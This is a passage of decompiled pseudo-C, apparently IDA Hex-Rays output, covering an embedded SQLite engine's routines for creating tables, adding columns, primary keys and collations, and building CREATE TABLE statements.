  int v8; // esi
  int v10; // [esp+4h] [ebp-Ch]
  int *v11; // [esp+8h] [ebp-8h]
  int v12; // [esp+Ch] [ebp-4h]

  v11 = 0;
  v2 = sub_10059297(a1);
  v4 = *(_DWORD *)(v3 + 4);
  v12 = 0;
  v10 = (int)v2;
  if ( v4 > 0 )
  {
    v5 = *(_DWORD *)(v3 + 8);
    do
    {
      v6 = v12;
      if ( v12 < 2 )
        v6 = v12 ^ 1;
      v7 = v5 + 16 * v6;
      v8 = *(_DWORD *)(v7 + 12);
      if ( !a2 || !sub_100593BE(a2, *(unsigned __int8 **)v7) )
      {
        v11 = sub_10068FF9(v10, (_DWORD *)(v8 + 20), a1);
        if ( v11 )
          break;
      }
      ++v12;
    }
    while ( v12 < v4 );
  }
  return v11;
}
// 10069F43: variable 'v3' is possibly undefined

//----- (10069FA1) --------------------------------------------------------
void __usercall sub_10069FA1(unsigned int a1@<esi>)
{
  int v1; // edi

  v1 = **(_DWORD **)(a1 + 16);
  sub_10058EC7(v1, *(_DWORD *)(a1 + 28));
  sub_10058EC7(v1, a1);
}

//----- (10069FBC) --------------------------------------------------------
void __usercall sub_10069FBC(unsigned __int8 *a1@<ecx>, int a2@<ebx>)
{
  _BYTE *v3; // eax
  unsigned int *v4; // edx
  int *v5; // eax
  int v6; // edx
  int *v7; // ecx
  int *v8; // edx

  v3 = sub_10059297(a1);
  v5 = sub_10069032(v4, a1, (int)v3, 0);
  if ( v5 )
  {
    v6 = v5[4];
    v7 = *(int **)(v6 + 20);
    if ( v7 == v5 )
    {
      *(_DWORD *)(v6 + 20) = v5[8];
    }
    else if ( v7 )
    {
      do
      {
        v8 = (int *)v7[8];
        if ( v8 == v5 )
          break;
        v7 = (int *)v7[8];
      }
      while ( v8 );
      if ( v7 && (int *)v7[8] == v5 )
        v7[8] = v5[8];
    }
    sub_10069FA1((unsigned int)v5);
  }
  *(_DWORD *)(a2 + 12) |= 0x200u;
}
// 10069FDA: variable 'v4' is possibly undefined

//----- (1006A029) --------------------------------------------------------
void __usercall sub_1006A029(int a1@<eax>, _DWORD *a2@<ebx>)
{
  int v3; // esi
  int v4; // eax
  unsigned int *v5; // esi
  _DWORD *v6; // esi
  _DWORD *v7; // edi
  _DWORD *v8; // eax
  int v9; // [esp+8h] [ebp-10h]
  int v10; // [esp+8h] [ebp-10h]
  int v11; // [esp+Ch] [ebp-Ch]
  int v12; // [esp+10h] [ebp-8h]
  int v13; // [esp+14h] [ebp-4h]

  if ( !a1 )
    sub_10068CBC((int)a2);
  v9 = a1;
  if ( a1 >= a2[1] )
  {
LABEL_9:
    a2[3] &= ~0x200u;
    sub_10070F16((int)a2);
    sub_10068D45((int)a2);
    v11 = 2;
    v10 = 2;
    if ( (int)a2[1] > 2 )
    {
      v12 = 32;
      v13 = 32;
      do
      {
        v4 = a2[2];
        v5 = (unsigned int *)(v13 + v4);
        if ( *(_DWORD *)(v13 + v4 + 4) )
        {
          if ( v11 < v10 )
          {
            *(_DWORD *)(v12 + v4) = *v5;
            v6 = v5 + 1;
            *(_DWORD *)(v12 + v4 + 4) = *v6++;
            v7 = (_DWORD *)(v12 + v4 + 8);
            *v7 = *v6;
            v7[1] = v6[1];
          }
          ++v11;
          v12 += 16;
        }
        else
        {
          sub_10058EC7((int)a2, *v5);
          *v5 = 0;
        }
        ++v10;
        v13 += 16;
      }
      while ( v10 < a2[1] );
    }
    memset((void *)(a2[2] + 16 * v11), 0, 16 * (a2[1] - v11));
    a2[1] = v11;
    if ( v11 <= 2 )
    {
      v8 = (_DWORD *)a2[2];
      if ( v8 != a2 + 104 )
      {
        memcpy(a2 + 104, v8, 0x20u);
        sub_10058EC7((int)a2, a2[2]);
        a2[2] = a2 + 104;
      }
    }
  }
  else
  {
    v3 = 16 * a1;
    while ( 1 )
    {
      if ( *(_DWORD *)(v3 + a2[2] + 12) )
        sub_100698C8(*(_DWORD **)(v3 + a2[2] + 12));
      if ( a1 > 0 )
        break;
      ++v9;
      v3 += 16;
      if ( v9 >= a2[1] )
        goto LABEL_9;
    }
  }
}

//----- (1006A14E) --------------------------------------------------------
void __usercall sub_1006A14E(int *a1@<edi>)
{
  int v1; // ebx
  unsigned int *v2; // esi
  int i; // [esp+8h] [ebp-4h]

  v1 = *a1;
  v2 = (unsigned int *)a1[4];
  if ( v2 )
  {
    for ( i = 0; i < a1[3]; v2 += 6 )
    {
      sub_10058EC7(v1, *v2);
      sub_10075FD8(v1, v2[1]);
      sub_10058EC7(v1, v2[2]);
      sub_10058EC7(v1, v2[3]);
      sub_10058EC7(v1, v2[4]);
      ++i;
    }
    sub_10058EC7(v1, a1[4]);
  }
  a1[4] = 0;
  a1[3] = 0;
}

//----- (1006A1BB) --------------------------------------------------------
void __cdecl sub_1006A1BB(unsigned int a1)
{
  int v1; // eax
  signed int i; // esi
  _BYTE *v3; // eax
  unsigned __int8 *v4; // ecx
  signed int v5; // [esp+10h] [ebp-8h]
  int v6; // [esp+14h] [ebp-4h]

  if ( a1 )
  {
    v1 = *(_DWORD *)a1;
    --*(_WORD *)(a1 + 32);
    v6 = v1;
    if ( !*(_WORD *)(a1 + 32) )
    {
      for ( i = *(_DWORD *)(a1 + 20); i; i = v5 )
      {
        v5 = *(_DWORD *)(i + 32);
        v3 = sub_10059297(*(_BYTE **)i);
        sub_10069032((unsigned int *)(*(_DWORD *)(i + 36) + 20), v4, (int)v3, 0);
        sub_10069FA1(i);
      }
      sub_10081A02((int *)a1);
      sub_1006A14E((int *)a1);
      sub_10058EC7(v6, *(_DWORD *)(a1 + 4));
      sub_10058EC7(v6, *(_DWORD *)(a1 + 40));
      sub_1007B016(v6, *(_DWORD *)(a1 + 28));
      sub_10075FD8(v6, *(_DWORD *)(a1 + 44));
      sub_10070ED7(a1, 0);
      if ( *(_DWORD *)(a1 + 60) )
      {
        if ( *(int *)(a1 + 56) > 0 )
        {
          do
            sub_10058EC7(*(_DWORD *)a1, *(_DWORD *)(*(_DWORD *)(a1 + 60) + 4 * i++));
          while ( i < *(_DWORD *)(a1 + 56) );
        }
        sub_10058EC7(*(_DWORD *)a1, *(_DWORD *)(a1 + 60));
      }
      sub_10058EC7(v6, a1);
    }
  }
}
// 1006A207: variable 'v4' is possibly undefined

//----- (1006A297) --------------------------------------------------------
int __usercall sub_1006A297@<eax>(int a1@<eax>, int a2@<ecx>)
{
  char *v2; // eax
  int v3; // ecx

  if ( !a1 )
    return 0;
  v2 = (char *)sub_100591D0(a2, *(_DWORD *)(a1 + 4), *(void **)a1);
  sub_10059363(v2);
  return v3;
}
// 1006A2B3: variable 'v3' is possibly undefined

//----- (1006A2B6) --------------------------------------------------------
void __usercall sub_1006A2B6(int *a1@<eax>, int a2)
{
  int *v3; // esi
  char *v4; // eax

  v3 = sub_1007C271(a1);
  v4 = aSqliteTempMast_1;
  if ( a2 != 1 )
    v4 = aSqliteMaster_1;
  sub_10069AEC((int)a1, 1, a2, 1, (int)v4);
  sub_1005AB66((int)v3, 39, 0, 1, a2);
  sub_1005AFA8(-1, v3, (unsigned __int16 *)5, (_BYTE *)0xFFFFFFF2);
  if ( !a1[17] )
    a1[17] = 1;
}

//----- (1006A313) --------------------------------------------------------
int __cdecl sub_1006A313(unsigned __int8 *a1)
{
  int v1; // esi
  _BYTE *v2; // eax
  int v3; // edx
  _BYTE **v4; // edi
  _BYTE *v5; // ebx
  unsigned __int8 *v6; // ecx

  v1 = -1;
  if ( a1 )
  {
    v2 = sub_10059297(a1);
    v1 = *(_DWORD *)(v3 + 4) - 1;
    v4 = (_BYTE **)(*(_DWORD *)(v3 + 8) + 16 * v1);
    v5 = v2;
    while ( v1 >= 0 && (v5 != sub_10059297(*v4) || sub_100593BE(v6, a1)) )
    {
      --v1;
      v4 -= 4;
    }
  }
  return v1;
}
// 1006A328: variable 'v3' is possibly undefined
// 1006A346: variable 'v6' is possibly undefined

//----- (1006A35E) --------------------------------------------------------
int __usercall sub_1006A35E@<eax>(int a1@<eax>, int *a2@<edx>, int *a3@<ecx>, int a4)
{
  int v5; // esi
  int result; // eax
  unsigned __int8 *v7; // ebx
  int v8; // [esp+10h] [ebp-4h]

  v5 = *a2;
  if ( a1 && *(_DWORD *)(a1 + 4) )
  {
    if ( *(_BYTE *)(v5 + 124) )
    {
      sub_10059320(a2, aCorruptDatabas);
LABEL_5:
      ++a2[16];
      return -1;
    }
    *a3 = a1;
    v7 = (unsigned __int8 *)sub_1006A297(a4, v5);
    v8 = sub_1006A313(v7);
    sub_10058EC7(v5, (unsigned int)v7);
    result = v8;
    if ( v8 < 0 )
    {
      sub_10059320(a2, aUnknownDatabas);
      goto LABEL_5;
    }
  }
  else
  {
    result = *(_DWORD *)(v5 + 116);
    *a3 = a4;
  }
  return result;
}

//----- (1006A3D4) --------------------------------------------------------
int __usercall sub_1006A3D4@<eax>(int a1@<eax>, _BYTE *a2)
{
  int v3; // eax

  v3 = *(_DWORD *)a1;
  if ( *(_BYTE *)(v3 + 124)
    || *(_BYTE *)(a1 + 19)
    || (*(_DWORD *)(v3 + 12) & 0x10000) != 0
    || sub_100593F9(a2, 7, (unsigned __int8 *)aSqlite) )
  {
    return 0;
  }
  sub_10059320((int *)a1, "object name reserved for internal use: %s", a2);
  return 1;
}

//----- (1006A41E) --------------------------------------------------------
void __usercall sub_1006A41E(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // ebx
  _DWORD *v9; // eax
  char *v10; // eax
  unsigned __int8 *v11; // edi
  _DWORD *v12; // eax
  _DWORD *v13; // edi
  char *v14; // eax
  int v15; // ecx
  int v16; // ecx
  bool v17; // zf
  _DWORD *v18; // eax
  int v19; // edi
  int v20; // edi
  char *v21; // eax
  int v22; // eax
  char *v23; // ebx
  int v24; // [esp-Ch] [ebp-28h]
  int v25; // [esp+Ch] [ebp-10h]
  _DWORD *v26; // [esp+10h] [ebp-Ch] BYREF
  char *Str1; // [esp+14h] [ebp-8h]
  int v28; // [esp+18h] [ebp-4h]

  v8 = *(_DWORD *)a2;
  v28 = sub_1006A35E(a1, (int *)a2, (int *)&v26, a3);
  if ( v28 < 0 )
    return;
  if ( a4 )
  {
    if ( v28 > 1 )
    {
      sub_10059320((int *)a2, aTemporaryTable);
      return;
    }
    v28 = 1;
  }
  v9 = v26;
  *(_DWORD *)(a2 + 480) = *v26;
  *(_DWORD *)(a2 + 484) = v9[1];
  v10 = (char *)sub_1006A297((int)v9, v8);
  v11 = (unsigned __int8 *)v10;
  Str1 = v10;
  if ( !v10 )
    return;
  if ( sub_1006A3D4(a2, v10) )
    goto LABEL_19;
  if ( !*(_BYTE *)(a2 + 520) )
  {
    if ( !sub_10058497((_DWORD *)a2) )
    {
      if ( sub_10069E40(v8, v11, *(unsigned __int8 **)(16 * v28 + *(_DWORD *)(v8 + 8))) )
      {
        if ( !a7 )
          sub_10059320((int *)a2, aTableTAlreadyE, v26);
        goto LABEL_19;
      }
      if ( sub_10069F30((unsigned __int8 *)Str1, 0) && (!v28 || !*(_BYTE *)(v8 + 124)) )
      {
        sub_10059320((int *)a2, aThereIsAlready, Str1);
        goto LABEL_19;
      }
      goto LABEL_17;
    }
LABEL_19:
    sub_10058EC7(v8, (unsigned int)Str1);
    return;
  }
LABEL_17:
  v12 = sub_1005904B(v8, 0x4Cu);
  v13 = v12;
  if ( !v12 )
  {
    *(_BYTE *)(v8 + 30) = 1;
    ++*(_DWORD *)(a2 + 64);
    *(_DWORD *)(a2 + 4) = 7;
    goto LABEL_19;
  }
  v12[2] = -1;
  v14 = Str1;
  v15 = v28;
  v13[1] = Str1;
  v16 = *(_DWORD *)(16 * v15 + *(_DWORD *)(v8 + 8) + 12);
  *v13 = 0;
  v13[17] = v16;
  *((_WORD *)v13 + 16) = 1;
  v17 = *(_BYTE *)(a2 + 19) == 0;
  *(_DWORD *)(a2 + 500) = v13;
  if ( v17 && !strcmp(v14, aSqliteSequence) )
    *(_DWORD *)(v13[17] + 68) = v13;
  if ( !*(_BYTE *)(v8 + 124) )
  {
    Str1 = (char *)sub_1007C271((int *)a2);
    if ( Str1 )
    {
      sub_1006CB39((int *)a2, v28, 0);
      if ( a6 )
        sub_1005ABB9((int)Str1, 121);
      v18 = (_DWORD *)(*(_DWORD *)(a2 + 72) + 1);
      v19 = *(_DWORD *)(a2 + 72) + 2;
      *(_DWORD *)(a2 + 412) = v19;
      v20 = v19 + 1;
      v24 = v28;
      v26 = v18;
      *(_DWORD *)(a2 + 408) = v18;
      v21 = Str1;
      *(_DWORD *)(a2 + 72) = v20;
      sub_1005AB66((int)v21, 35, v24, v20, 2);
      sub_1005B0F6(v28, (int *)Str1);
      v25 = sub_1005ABD1((int)Str1, 26, v20);
      sub_1005ABE8((int)Str1, 7, (*(_DWORD *)(v8 + 12) & 0x100000) != 0 ? 1 : 4, v20);
      sub_1005AB66((int)Str1, 36, v28, 2, v20);
      v22 = *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)(v8 + 8) + 12) + 73);
      v23 = Str1;
      sub_1005ABE8((int)Str1, 7, v22, v20);
      sub_1005AB66((int)v23, 36, v28, 5, v20);
      sub_1005AE20(v25, (int)v23);
      if ( a5 || a6 )
        sub_1005ABE8((int)v23, 7, 0, (int)v26 + 1);
      else
        sub_1005ABE8((int)v23, 97, v28, (int)v26 + 1);
      sub_1006A2B6((int *)a2, v28);
      sub_1005ABE8((int)v23, 53, 0, (int)v26);
      sub_1005ABE8((int)v23, 10, 0, v20);
      sub_1005AB66((int)v23, 54, 0, v20, (int)v26);
      sub_1005AE0E((int)v23, 8);
      sub_1005ABB9((int)v23, 42);
    }
  }
}

//----- (1006A6E3) --------------------------------------------------------
void __cdecl sub_1006A6E3(int *a1, int a2)
{
  int v2; // esi
  int v3; // edi
  unsigned __int8 *v4; // eax
  unsigned int v5; // ebx
  unsigned __int8 **v6; // edi
  int v7; // eax
  _DWORD *v8; // eax
  _BYTE *v9; // edi
  int v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  char v12; // [esp+17h] [ebp-1h]

  v2 = a1[125];
  v3 = *a1;
  v10 = *a1;
  if ( v2 )
  {
    if ( *(_DWORD *)(v2 + 12) + 1 > *(_DWORD *)(v3 + 80) )
    {
      sub_10059320(a1, "too many columns on %s", *(const char **)(v2 + 4));
      return;
    }
    v4 = (unsigned __int8 *)sub_1006A297(a2, v3);
    v5 = (unsigned int)v4;
    if ( v4 )
    {
      v11 = 0;
      if ( *(int *)(v2 + 12) <= 0 )
      {
LABEL_11:
        v7 = *(_DWORD *)(v2 + 12);
        if ( (v7 & 7) == 0 )
        {
          v8 = sub_100590DA(v3, *(void **)(v2 + 16), 24 * (v7 + 8));
          if ( !v8 )
          {
            sub_10058EC7(v3, v5);
            return;
          }
          *(_DWORD *)(v2 + 16) = v8;
        }
        v9 = (_BYTE *)(*(_DWORD *)(v2 + 16) + 24 * *(_DWORD *)(v2 + 12));
        memset(v9, 0, 0x18u);
        *(_DWORD *)v9 = v5;
        v9[22] = 98;
        ++*(_DWORD *)(v2 + 12);
      }
      else
      {
        v6 = *(unsigned __int8 ***)(v2 + 16);
        v12 = byte_100FEEC0[*v4];
        while ( v12 != byte_100FEEC0[**v6] || sub_100593BE((unsigned __int8 *)(v5 + 1), *v6 + 1) )
        {
          ++v11;
          v6 += 6;
          if ( v11 >= *(_DWORD *)(v2 + 12) )
          {
            v3 = v10;
            goto LABEL_11;
          }
        }
        sub_10059320(a1, "duplicate column name: %s", (const char *)v5);
        sub_10058EC7(v10, v5);
      }
    }
  }
}

//----- (1006A7EB) --------------------------------------------------------
char __fastcall sub_1006A7EB(int a1, _BYTE *a2)
{
  int v2; // esi
  char result; // al

  v2 = 0;
  result = 99;
  if ( a2 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        if ( !*a2 )
          return result;
        v2 = (unsigned __int8)byte_100FEEC0[(unsigned __int8)*a2++] + (v2 << 8);
        if ( v2 != 1667785074 && v2 != 1668050786 && v2 != 1952807028 )
          break;
        result = 97;
      }
      if ( v2 == 1651273570 )
      {
        if ( result == 99 || result == 101 )
        {
          result = 98;
        }
        else
        {
LABEL_16:
          if ( (v2 & 0xFFFFFF) == 6909556 )
            return 100;
        }
      }
      else
      {
        if ( v2 != 1919246700 && v2 != 1718382433 && v2 != 1685026146 || result != 99 )
          goto LABEL_16;
        result = 101;
      }
    }
  }
  return result;
}

//----- (1006A872) --------------------------------------------------------
void __usercall sub_1006A872(int *a1@<eax>, int a2@<ebx>)
{
  int v2; // eax
  int v3; // esi
  _DWORD *v4; // eax
  unsigned int v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+Ch] [ebp-4h]

  v6 = *a1;
  v2 = a1[125];
  if ( v2 )
  {
    v3 = 24 * *(_DWORD *)(v2 + 12) + *(_DWORD *)(v2 + 16) - 24;
    sub_10076851(*(_DWORD *)a2);
    sub_10075FD8(v6, *(_DWORD *)(v3 + 4));
    v4 = sub_1007631C(v6, *(void ***)a2, 1);
    v5 = *(_DWORD *)(v3 + 8);
    *(_DWORD *)(v3 + 4) = v4;
    sub_10058EC7(v6, v5);
    *(_DWORD *)(v3 + 8) = sub_100591D0(v6, *(_DWORD *)(a2 + 8) - *(_DWORD *)(a2 + 4), *(void **)(a2 + 4));
  }
  sub_10075FD8(v6, *(_DWORD *)a2);
}

//----- (1006A905) --------------------------------------------------------
void __cdecl sub_1006A905(int a1, int *a2, int a3, int a4, int a5)
{
  int v5; // esi
  int v6; // edi
  char v7; // al
  int *v8; // eax
  unsigned __int8 **v9; // ebx
  unsigned __int8 *v10; // ecx
  int v11; // eax
  unsigned __int8 *v12; // [esp+10h] [ebp-Ch]
  int v13; // [esp+14h] [ebp-8h]
  int v14; // [esp+18h] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 500);
  v6 = -1;
  if ( v5 && !*(_BYTE *)(a1 + 520) )
  {
    v7 = *(_BYTE *)(v5 + 34);
    if ( (v7 & 4) != 0 )
    {
      sub_10059320((int *)a1, "table \"%s\" has more than one primary key", *(const char **)(v5 + 4));
    }
    else
    {
      *(_BYTE *)(v5 + 34) = v7 | 4;
      v8 = a2;
      if ( a2 )
      {
        v13 = 0;
        if ( *a2 > 0 )
        {
          v14 = 0;
          do
          {
            v6 = 0;
            if ( *(int *)(v5 + 12) > 0 )
            {
              v9 = *(unsigned __int8 ***)(v5 + 16);
              v12 = *(unsigned __int8 **)(v8[3] + v14 + 4);
              do
              {
                if ( !sub_100593BE(v12, *v9) )
                  break;
                ++v6;
                v9 += 6;
              }
              while ( v6 < *(_DWORD *)(v5 + 12) );
              v8 = a2;
            }
            if ( v6 < *(_DWORD *)(v5 + 12) )
              *(_BYTE *)(24 * v6 + *(_DWORD *)(v5 + 16) + 21) = 1;
            ++v13;
            v14 += 20;
          }
          while ( v13 < *v8 );
        }
        if ( *v8 > 1 )
          v6 = -1;
      }
      else
      {
        v6 = *(_DWORD *)(v5 + 12) - 1;
        *(_BYTE *)(24 * v6 + *(_DWORD *)(v5 + 16) + 21) = 1;
      }
      if ( v6 >= 0 && v6 < *(_DWORD *)(v5 + 12) )
      {
        v10 = *(unsigned __int8 **)(24 * v6 + *(_DWORD *)(v5 + 16) + 12);
        if ( v10 )
        {
          if ( !sub_100593BE(v10, (unsigned __int8 *)aInteger_0) && !a5 )
          {
            *(_BYTE *)(v5 + 35) = a3;
            *(_BYTE *)(v5 + 34) |= 8 * (_BYTE)a4;
            *(_DWORD *)(v5 + 8) = v6;
            goto LABEL_31;
          }
          v8 = a2;
        }
      }
      if ( a4 )
      {
        sub_10059320((int *)a1, aAutoincrementI);
      }
      else
      {
        v11 = sub_1006BC68(0, (int *)a1, 0, 0, v8, a3, 0, 0, a5, 0);
        if ( v11 )
          *(_BYTE *)(v11 + 25) = 2;
        a2 = 0;
      }
    }
  }
LABEL_31:
  sub_100767B1(a2, *(_DWORD *)a1);
}

//----- (1006AA62) --------------------------------------------------------
void __usercall sub_1006AA62(int a1@<eax>, _DWORD *a2)
{
  int v2; // ecx
  int v3; // esi

  v2 = *(_DWORD *)a1;
  v3 = *(_DWORD *)(a1 + 500);
  if ( !v3 || *(_BYTE *)(a1 + 520) )
    sub_10075FD8(v2, (unsigned int)a2);
  else
    *(_DWORD *)(v3 + 44) = sub_10075DEF(a2, v2, *(_DWORD *)(v3 + 44));
}

//----- (1006AA9A) --------------------------------------------------------
void __cdecl sub_1006AA9A(int *a1, int a2)
{
  _DWORD *v2; // esi
  int v3; // edi
  char *v4; // ebx
  int i; // ecx
  int v6; // [esp+Ch] [ebp-4h]

  v2 = (_DWORD *)a1[125];
  if ( v2 )
  {
    v3 = v2[3] - 1;
    v6 = *a1;
    v4 = (char *)sub_1006A297(a2, *a1);
    if ( v4 )
    {
      if ( sub_1006AB10(a1, v4) )
      {
        *(_DWORD *)(v2[4] + 24 * v3 + 16) = v4;
        for ( i = v2[5]; i; i = *(_DWORD *)(i + 32) )
        {
          if ( **(_DWORD **)(i + 8) == v3 )
            **(_DWORD **)(i + 44) = *(_DWORD *)(v2[4] + 24 * v3 + 16);
        }
      }
      else
      {
        sub_10058EC7(v6, (unsigned int)v4);
      }
    }
  }
}

//----- (1006AB10) --------------------------------------------------------
int *__usercall sub_1006AB10@<eax>(int *a1@<eax>, char *Src)
{
  int v3; // esi
  unsigned __int8 v4; // bl
  int *result; // eax
  unsigned __int8 v6; // [esp+10h] [ebp-4h]

  v3 = *a1;
  v4 = *(_BYTE *)(*a1 + 124);
  v6 = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*a1 + 8) + 12) + 73);
  result = sub_10069699(*a1, v6, Src, v4);
  if ( !v4 && (!result || !result[3]) )
  {
    result = sub_100695A6(result, v3, v6, Src);
    if ( !result )
    {
      sub_10059320(a1, "no such collation sequence: %s", Src);
      return 0;
    }
  }
  return result;
}

//----- (1006AB7A) --------------------------------------------------------
int __usercall sub_1006AB7A@<eax>(_DWORD *a1@<esi>, int a2)
{
  int v2; // eax
  int v3; // edi
  int v4; // ebx

  v2 = sub_10078A55((int)a1);
  v3 = a1[3];
  v4 = v2;
  sub_1005ABE8(v3, 7, **(_DWORD **)(*(_DWORD *)(*a1 + 8) + 16 * a2 + 12) + 1, v2);
  sub_1005AB66(v3, 36, a2, 1, v4);
  return sub_10078A70((int)a1, v4);
}

//----- (1006ABCC) --------------------------------------------------------
_DWORD *__usercall sub_1006ABCC@<eax>(unsigned __int8 *a1@<eax>, int a2, _DWORD *a3)
{
  unsigned __int8 *v3; // ebx
  int v4; // esi
  int v5; // edi
  unsigned __int8 v6; // cl
  int v7; // edi
  int v8; // eax
  _DWORD *result; // eax

  v3 = a1;
  v4 = *a3;
  v5 = 0;
  if ( *a1 )
  {
    v6 = *a1;
    do
    {
      if ( (byte_100FEFC0[v6] & 6) == 0 && v6 != 95 )
        break;
      v6 = a1[++v5];
    }
    while ( v6 );
  }
  if ( (byte_100FEFC0[*a1] & 4) != 0 || sub_100718F6(a1, v5) != 26 )
  {
    v7 = 1;
LABEL_10:
    v8 = a2;
    *(_BYTE *)(v4 + a2) = 34;
    ++v4;
    goto LABEL_16;
  }
  v7 = v3[v5];
  if ( v7 )
    goto LABEL_10;
  v8 = a2;
LABEL_16:
  while ( *v3 )
  {
    *(_BYTE *)(v4 + v8) = *v3;
    ++v4;
    if ( *v3 == 34 )
    {
      *(_BYTE *)(v4 + v8) = 34;
      ++v4;
    }
    ++v3;
  }
  if ( v7 )
  {
    *(_BYTE *)(v4 + v8) = 34;
    ++v4;
  }
  *(_BYTE *)(v4 + v8) = 0;
  result = a3;
  *a3 = v4;
  return result;
}

//----- (1006AC5B) --------------------------------------------------------
_BYTE *__usercall sub_1006AC5B@<eax>(int a1@<ebx>, int a2)
{
  _BYTE **v2; // edx
  int v3; // esi
  _BYTE *v4; // eax
  int v5; // edi
  bool v6; // zf
  _BYTE *v7; // eax
  int v8; // edx
  int v9; // eax
  int v10; // esi
  int v11; // eax
  _BYTE *v12; // edi
  _BYTE *v14; // esi
  _BYTE *v15; // esi
  _BYTE *v16; // eax
  _BYTE *v17; // esi
  const void *v18; // ecx
  _BYTE *v19; // [esp+Ch] [ebp-20h]
  const char *v20; // [esp+10h] [ebp-1Ch]
  char *v21; // [esp+14h] [ebp-18h]
  int v22; // [esp+18h] [ebp-14h]
  int v23; // [esp+18h] [ebp-14h]
  int i; // [esp+1Ch] [ebp-10h]
  char *v25; // [esp+20h] [ebp-Ch]
  _BYTE *v26; // [esp+24h] [ebp-8h] BYREF
  int v27; // [esp+28h] [ebp-4h]

  v27 = 0;
  v2 = *(_BYTE ***)(a1 + 16);
  v3 = *(_DWORD *)(a1 + 12);
  if ( v3 > 0 )
  {
    v22 = *(_DWORD *)(a1 + 12);
    do
    {
      v4 = *v2;
      v5 = 0;
      while ( *v4 )
      {
        if ( *v4 == 34 )
          ++v5;
        ++v5;
        ++v4;
      }
      v2 += 6;
      v6 = v22-- == 1;
      v27 += v5 + 7;
    }
    while ( !v6 );
  }
  v7 = *(_BYTE **)(a1 + 4);
  v8 = 0;
  while ( *v7 )
  {
    if ( *v7 == 34 )
      ++v8;
    ++v8;
    ++v7;
  }
  v9 = v27 + v8 + 2;
  if ( v9 >= 50 )
  {
    v25 = asc_10180E44;
    v21 = asc_10180E48;
    v20 = asc_10180E50;
  }
  else
  {
    v25 = (char *)&unk_101863F6;
    v21 = asc_10180E3C;
    v20 = asc_10180E40;
  }
  v10 = v9 + 6 * v3 + 35;
  v27 = v10;
  v11 = sub_10058C4C(v10);
  v12 = (_BYTE *)v11;
  if ( v11 )
  {
    sub_10055543(v10, v11, aCreateTable);
    v26 = sub_10059297(v12);
    sub_1006ABCC(*(unsigned __int8 **)(a1 + 4), (int)v12, &v26);
    v14 = v26;
    v23 = 0;
    v12[(_DWORD)v26] = 40;
    v15 = v14 + 1;
    for ( i = *(_DWORD *)(a1 + 16); v23 < *(_DWORD *)(a1 + 12); ++v23 )
    {
      sub_10055543(v27 - (_DWORD)v15, (int)&v12[(_DWORD)v15], v25);
      v25 = v21;
      v26 = &v15[(_DWORD)sub_10059297(&v12[(_DWORD)v15])];
      sub_1006ABCC(*(unsigned __int8 **)i, (int)v12, &v26);
      v16 = sub_10059297((_BYTE *)dword_100FEA18[*(char *)(i + 22)]);
      v17 = v26;
      v19 = v16;
      memcpy(&v12[(_DWORD)v26], v18, (size_t)v16);
      v15 = &v17[(_DWORD)v19];
      i += 24;
    }
    sub_10055543(v27 - (_DWORD)v15, (int)&v12[(_DWORD)v15], "%s", v20);
    return v12;
  }
  else
  {
    *(_BYTE *)(a2 + 30) = 1;
    return 0;
  }
}
// 1006AD9B: variable 'v18' is possibly undefined
// 100FEA18: using guessed type int dword_100FEA18[54];

//----- (1006ADD2) --------------------------------------------------------
int *__cdecl sub_1006ADD2(int a1, _DWORD *a2, _DWORD *a3, _DWORD **a4)
{
  int *result; // eax
  int v5; // edi
  int v6; // ebx
  int v7; // eax
  bool v8; // zf
  int v9; // eax
  int v10; // edi
  int v11; // edi
  const char *v12; // edx
  _BYTE *v13; // eax
  unsigned int v14; // esi
  char *v15; // edx
  int v16; // ecx
  _DWORD *v17; // eax
  int v18; // esi
  unsigned __int16 *v19; // eax
  _BYTE *v20; // eax
  int v21; // edx
  unsigned __int8 *v22; // ecx
  int v23; // [esp-20h] [ebp-B8h]
  int v24; // [esp-10h] [ebp-A8h]
  int v25; // [esp-Ch] [ebp-A4h]
  int v26; // [esp-4h] [ebp-9Ch]
  int v27; // [esp-4h] [ebp-9Ch]
  int v28[16]; // [esp+10h] [ebp-88h] BYREF
  int v29[9]; // [esp+50h] [ebp-48h] BYREF
  char v30[4]; // [esp+74h] [ebp-24h] BYREF
  int v31; // [esp+78h] [ebp-20h]
  int v32; // [esp+7Ch] [ebp-1Ch]
  int v33; // [esp+80h] [ebp-18h]
  int v34; // [esp+84h] [ebp-14h]
  char *v35; // [esp+88h] [ebp-10h]
  int *v36; // [esp+8Ch] [ebp-Ch]
  int v37; // [esp+90h] [ebp-8h]
  int v38; // [esp+94h] [ebp-4h]

  result = (int *)a1;
  v5 = *(_DWORD *)a1;
  v38 = *(_DWORD *)a1;
  if ( (a3 || a4) && !*(_BYTE *)(v5 + 30) )
  {
    v6 = *(_DWORD *)(a1 + 500);
    if ( v6 )
    {
      v7 = sub_1005855F(v5, *(_DWORD *)(v6 + 68));
      v8 = *(_DWORD *)(v6 + 44) == 0;
      v37 = v7;
      if ( !v8 )
      {
        memset(v29, 0, sizeof(v29));
        memset(v28, 0, sizeof(v28));
        v9 = *(_DWORD *)(v6 + 4);
        v10 = *(_DWORD *)(v6 + 44);
        v28[8] = -1;
        v28[3] = v9;
        v29[0] = a1;
        LOWORD(v28[0]) = 1;
        v28[5] = v6;
        v29[1] = (int)v28;
        BYTE2(v29[5]) = 1;
        result = (int *)sub_1008003C(v10, (int)v29);
        if ( result )
          return result;
        v5 = v38;
      }
      if ( *(_BYTE *)(v5 + 124) )
      {
        *(_DWORD *)(v6 + 24) = *(_DWORD *)(v5 + 120);
        if ( *(_BYTE *)(v5 + 124) )
          goto LABEL_26;
      }
      v11 = a1;
      result = sub_1007C271((int *)a1);
      v36 = result;
      if ( !result )
        return result;
      sub_1005ABD1((int)result, 42, 0);
      if ( *(_DWORD *)(v6 + 28) )
      {
        v35 = aView;
        v12 = aView_0;
      }
      else
      {
        v35 = aTable;
        v12 = aTable_0;
      }
      if ( a4 )
      {
        sub_1005AB66((int)v36, 39, 1, *(_DWORD *)(a1 + 412), v37);
        sub_1005AE0E((int)v36, 1);
        v32 = 0;
        v33 = 0;
        *(_DWORD *)(a1 + 68) = 2;
        strcpy(v30, "\b");
        v31 = 1;
